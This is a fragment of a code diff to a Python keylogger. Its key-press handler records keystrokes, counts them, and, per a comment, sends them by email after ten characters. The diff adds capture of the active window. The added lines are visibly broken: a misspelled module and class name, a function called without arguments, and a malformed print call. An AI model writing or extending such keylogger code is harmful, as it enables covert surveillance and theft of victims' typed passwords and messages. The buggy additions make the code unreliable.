@@ -30,8 +30,12 @@ def on_press(key):
     keys.append(key)
     #incrementing the count by 1
     count+= 1
-    #printing the key pressed
-    print("{0} pressed". format(key))
+    #importing libraries to capture the window
+    from PIL import Imagegrab
+    import win32giu
+    #printing the key pressed and the window
+    window_opened = win32gui.FindWindow()
+    print("{0} pressed", format(key), "window:", window_opened)
     #sending the email after 10 characters recorded
     if count >= 10:
         #making the variable 0 to count again
